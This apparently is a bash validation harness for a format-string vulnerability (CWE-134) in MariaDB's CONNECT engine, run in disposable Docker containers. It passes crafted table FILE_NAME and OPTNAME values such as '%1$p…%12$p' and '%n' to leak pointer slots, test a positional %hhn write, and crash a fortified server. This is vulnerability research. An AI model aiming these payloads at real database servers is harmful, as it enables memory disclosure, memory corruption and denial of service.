#!/usr/bin/env bash
set -Eeuo pipefail

cd "$(dirname "$0")"
command -v docker >/dev/null || { echo "docker is required" >&2; exit 2; }

image_tag="mariadb-connect-cwe134:local"
docker build --build-arg "MARIADB_IMAGE=${MARIADB_IMAGE:-mariadb:11.4}" -t "$image_tag" .

failures=0

run_case() {
  local name="$1"
  local filename="$2"
  local expectation="$3"
  local container="connect-cwe134-${name}-$$"
  local log_file="result-${name}.log"
  local sql_file
  sql_file="$(mktemp)"
  cat >"$sql_file" <<SQL
CREATE DATABASE cwe134;
USE cwe134;
SELECT VERSION() AS mariadb_version;
SELECT PLUGIN_NAME, PLUGIN_STATUS FROM information_schema.PLUGINS
 WHERE PLUGIN_NAME = 'CONNECT';
CREATE TABLE t_cwe134 (
  id INT,
  v VARCHAR(32)
) ENGINE=CONNECT TABLE_TYPE=CSV FILE_NAME='${filename}'
PARTITION BY RANGE(id) (
  PARTITION p0 VALUES LESS THAN (10),
  PARTITION p1 VALUES LESS THAN MAXVALUE
);
INSERT INTO t_cwe134 VALUES (1, 'probe');
SELECT * FROM t_cwe134;
SQL

  echo "===== case: $name ====="
  docker run -d --name "$container" \
    -e MARIADB_ROOT_PASSWORD=test-only-password \
    -e LD_PRELOAD=/usr/local/lib/libconnect_fmt_probe.so \
    "$image_tag" >/dev/null

  local ready=0
  for _ in $(seq 1 90); do
    if docker exec "$container" mariadb-admin --protocol=tcp -h127.0.0.1 \
      -uroot -ptest-only-password ping --silent >/dev/null 2>&1; then
      ready=1
      break
    fi
    if ! docker inspect -f '{{.State.Running}}' "$container" 2>/dev/null | grep -q true; then
      break
    fi
    sleep 2
  done

  if [[ "$ready" -ne 1 ]]; then
    echo "FAIL: MariaDB did not become TCP-ready" | tee "$log_file"
    docker logs "$container" >>"$log_file" 2>&1 || true
    docker rm -f "$container" >/dev/null 2>&1 || true
    rm -f "$sql_file"
    failures=$((failures + 1))
    return
  fi

  set +e
  docker exec -i "$container" mariadb --protocol=tcp -h127.0.0.1 \
    -uroot -ptest-only-password --show-warnings <"$sql_file" >"$log_file" 2>&1
  local sql_rc=$?
  set -e

  sleep 2
  local running
  running="$(docker inspect -f '{{.State.Running}}' "$container" 2>/dev/null || echo missing)"
  echo "sql_exit_code=$sql_rc" | tee -a "$log_file"
  echo "container_running_after_test=$running" | tee -a "$log_file"
  docker logs "$container" >>"$log_file" 2>&1 || true
  cat "$log_file"

  if [[ "$expectation" == "normal" ]]; then
    if [[ "$sql_rc" -eq 0 ]] && grep -q $'1\tprobe' "$log_file" && [[ "$running" == "true" ]]; then
      echo "PASS: SQL completed, returned expected row, server remained alive ($name)"
    else
      echo "FAIL: expected normal completion and live server ($name)" >&2
      failures=$((failures + 1))
    fi
  elif [[ "$expectation" == "arg-probe" ]]; then
    if grep -Fq "CONNECT_FMT_PROBE" "$log_file" && [[ "$running" == "true" ]]; then
      echo "PASS: captured real MariaDB CONNECT variadic argument slots ($name)"
    else
      echo "FAIL: expected variadic argument probe result ($name)" >&2
      failures=$((failures + 1))
    fi
  elif [[ "$expectation" == "arg-write" ]]; then
    if grep -Fq "CONNECT_FMT_PROBE" "$log_file" && \
       grep -Fq "CONNECT_MEM arg11" "$log_file" && \
       grep -Fq "CONNECT_MEM arg32" "$log_file" && [[ "$running" == "true" ]]; then
      echo "PASS: positional %hhn write executed in disposable MariaDB process ($name)"
    else
      echo "FAIL: expected isolated positional %hhn write result ($name)" >&2
      failures=$((failures + 1))
    fi
  elif [[ "$expectation" == "fortify-abort" ]]; then
    if grep -Fq "*** %n in writable segment detected ***" "$log_file" && \
       grep -Fq "__snprintf_chk" "$log_file" && [[ "$running" == "false" ]]; then
      echo "PASS: %n reached fortified snprintf and aborted the server ($name)"
    else
      echo "FAIL: expected fortified %n abort was not observed ($name)" >&2
      failures=$((failures + 1))
    fi
  fi

  docker rm -f "$container" >/dev/null 2>&1 || true
  rm -f "$sql_file"
}

run_case baseline "ordinary.csv" normal
run_case extra-s "d_%s%s%s%s.csv" normal
run_case arg-probe 'PROBE_%1$p_%2$p_%3$p_%4$p_%5$p_%6$p_%7$p_%8$p_%9$p_%10$p_%11$p_%12$p.csv' arg-probe
run_optname_case() {
  local container="connect-cwe134-optname-$$"
  local sql_file
  sql_file="$(mktemp)"
  cat >"$sql_file" <<'SQL'
CREATE DATABASE cwe134;
USE cwe134;
CREATE TABLE t_optprobe (
  id INT,
  v VARCHAR(32)
) ENGINE=CONNECT TABLE_TYPE=CSV
  OPTNAME='PROBE_%1$p_%2$p_%3$p_%4$p_%5$p_%6$p_%7$p_%8$p_%9$p_%10$p_%11$p_%12$p.csv'
PARTITION BY RANGE(id) (
  PARTITION p0 VALUES LESS THAN (10),
  PARTITION p1 VALUES LESS THAN MAXVALUE
);
ALTER TABLE t_optprobe ADD KEY idx_probe_id (id);
SHOW WARNINGS;
SQL
  docker run -d --name "$container" \
    -e MARIADB_ROOT_PASSWORD=test-only-password \
    -e LD_PRELOAD=/usr/local/lib/libconnect_fmt_probe.so \
    "$image_tag" >/dev/null
  local ready=0
  for _ in $(seq 1 90); do
    if docker exec "$container" mariadb-admin --protocol=tcp -h127.0.0.1 \
      -uroot -ptest-only-password ping --silent >/dev/null 2>&1; then
      ready=1
      break
    fi
    if ! docker inspect -f '{{.State.Running}}' "$container" 2>/dev/null | grep -q true; then break; fi
    sleep 2
  done
  if [[ "$ready" -ne 1 ]]; then
    echo "FAIL: optname probe MariaDB did not become TCP-ready"
    docker logs "$container" || true
    docker rm -f "$container" >/dev/null 2>&1 || true
    rm -f "$sql_file"
    failures=$((failures + 1))
    return
  fi
  set +e
  docker exec -i "$container" mariadb --protocol=tcp -h127.0.0.1 \
    -uroot -ptest-only-password --show-warnings <"$sql_file" >result-optname.log 2>&1
  local sql_rc=$?
  set -e
  sleep 2
  local running
  running="$(docker inspect -f '{{.State.Running}}' "$container" 2>/dev/null || echo missing)"
  echo "sql_exit_code=$sql_rc" | tee -a result-optname.log
  echo "container_running_after_test=$running" | tee -a result-optname.log
  docker logs "$container" >>result-optname.log 2>&1 || true
  cat result-optname.log
  if grep -Fq "CONNECT_FMT_PROBE" result-optname.log && [[ "$running" == "true" ]]; then
    echo "PASS: OPTNAME path reached the CONNECT format-string call"
  else
    echo "FAIL: OPTNAME path did not reach the instrumented formatter" >&2
    failures=$((failures + 1))
  fi
  docker rm -f "$container" >/dev/null 2>&1 || true
  rm -f "$sql_file"
}

run_optname_case
run_case percent-n "d_%n.csv" fortify-abort

if [[ "$failures" -ne 0 ]]; then
  echo "Validation harness had $failures failed case(s)." >&2
  exit 1
fi

echo "All expected outcomes observed. The probe reports raw slots; it does not claim RCE."
